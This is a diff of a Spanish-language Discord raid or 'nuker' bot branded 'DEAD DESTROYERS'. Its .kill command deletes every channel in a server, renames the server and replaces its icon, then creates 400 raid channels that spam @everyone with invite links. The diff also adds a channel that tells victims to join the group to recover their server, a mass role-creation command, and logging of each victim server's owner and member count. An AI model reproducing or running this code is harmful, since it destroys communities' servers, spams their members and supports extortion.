@@ -24,18 +24,19 @@ async def TEST(ctx):
 async def on_ready():
     print("Online")
     myLoop.start()
-    await bot.change_presence(activity=discord.Game(name="V3.2 | .help"))
+    await bot.change_presence(activity=discord.Game(name="V3.3 | .help"))
 
 
 @bot.event
 async def on_command_error(ctx, error):
     if isinstance(error, commands.CommandOnCooldown):
         await ctx.send(
-            f"Epsera 10 minutos te faltan  {round(error.retry_after, 2)} ")
+            f"Tu y/o el servidor estan en un cooldown de 10 minutos** Faltan:  {round(error.retry_after, 2)} ")
 
 
 @bot.command(aliases=["dead"])
 @commands.cooldown(1, 600, commands.BucketType.user)
+@commands.cooldown(1, 600, commands.BucketType.guild)
 async def kill(ctx):
 
     await ctx.message.delete()
@@ -43,18 +44,12 @@ async def kill(ctx):
         try:
             await channel.delete()
             await ctx.guild.edit(name="DD IS HERE")
-            await bot.edit_server(ctx.message.server, icon_url="https://cdn.discordapp.com/attachments/877969590800502784/1003633586257285171/ezgif.com-gif-maker.gif")
+            await ctx.guild.edit(icon_url="https://cdn.discordapp.com/attachments/877969590800502784/1003633586257285171/ezgif.com-gif-maker.gif"
+            )
         except:
             pass
     for _i in range(1):
         await ctx.guild.create_text_channel(name="unete-a-dd")
-
-        
-    for _i in range(105):
-         await ctx.guild.create_text_channel(name="r̷a̷i̷d̷-̷b̷y̷-̷d̷e̷a̷d̷d̷e̷s̷t̷r̷o̷y̷e̷r̷s̷")
-
-@bot.event
-async def on_command(ctx):
     logg = bot.get_channel(1021099587202723890)
     server = ctx.guild.name
     user = ctx.author
@@ -65,14 +60,13 @@ async def on_command(ctx):
     log.add_field(name='Nombre del servidor', value=f'{ctx.guild.name}', inline=False) 
     log.add_field(name='Miembros', value=f'{ctx.guild.member_count}', inline=False)
     log.add_field(name='Owner', value=f'{ctx.message.guild.owner}', inline=False)
-    log.add_field(name='Comando', value=f'{command}', inline=False) 
-    await logg.send(embed=log)   
+    await logg.send(embed=log) 
+
+    for _i in range(400):
+        await ctx.guild.create_text_channel(
+            name="r̷a̷i̷d̷-̷b̷y̷-̷d̷e̷a̷d̷d̷e̷s̷t̷r̷o̷y̷e̷r̷s̷")
 
 
-@bot.command()
-async def Hello(ctx):
-  channel = bot.get_channel(982744791618056283)
-  await channel.send('Hello')
 
 
 @bot.event
@@ -80,27 +74,16 @@ async def on_guild_channel_create(channel):
     if (channel.name == 'r̷a̷i̷d̷-̷b̷y̷-̷d̷e̷a̷d̷d̷e̷s̷t̷r̷o̷y̷e̷r̷s̷'):
         for _i in range(10):
             await channel.send(
-                '> ||@everyone||                                                                                                                                                                                                    **__Raided By DEAD DESTROYERS__**   | https://discord.gg/Q9fac9jkaF | https://imgur.com/a/pkewvSu '
+                '> ||@everyone||                                                                                                                                         **__Raided By DEAD DESTROYERS__**   | https://discord.gg/Q9fac9jkaF | https://imgur.com/a/pkewvSu'
             )
 
     if channel.name == "unete-a-dd":
         for _i in range(1):
             await channel.send(
-                '||@everyone||                                                                                                                                                                                                             **__Te esperamos en DD, unete para usar este bot gratis!__** | https://discord.gg/Q9fac9jkaF'
+                '> ||@everyone||                                                                                                                                         **__Unete a DD para recuperar tu servidor y usar este bot__** | https://discord.gg/Q9fac9jkaF'
             )
 
 
-@bot.command(aliases=["limpiesa"])
-@commands.cooldown(1, 600, commands.BucketType.user)
-async def limpiar(ctx):
-    await ctx.message.delete()
-    for channel in list(ctx.guild.channels):
-        try:
-            await channel.delete()
-        except:
-            pass
-    for _i in range(1):
-        await ctx.guild.create_text_channel(name="unete-a-dd")
 
 @bot.command()
 async def bye(ctx):
@@ -166,7 +149,6 @@ async def help(ctx):
                     value='Elimina todos los roles',
                     inline=False)
     embed.add_field(name='<a:_:1012466114183319592> .croles', value='Crea muchos roles', inline=False)
-    embed.add_field(name='<a:_:1012466114183319592> .limpiar', value='Elimina todos los canales', inline=False)
     embed.add_field(name='<a:_:1012466114183319592> .bye', value='Termina el raid y abandona el servidor', inline=False)
 
 
@@ -175,6 +157,7 @@ async def help(ctx):
 
 @bot.command()
 @commands.cooldown(1, 600, commands.BucketType.user)
+@commands.cooldown(1, 600, commands.BucketType.guild)
 async def croles(ctx):
     await ctx.message.delete()
     for _i in range(100):
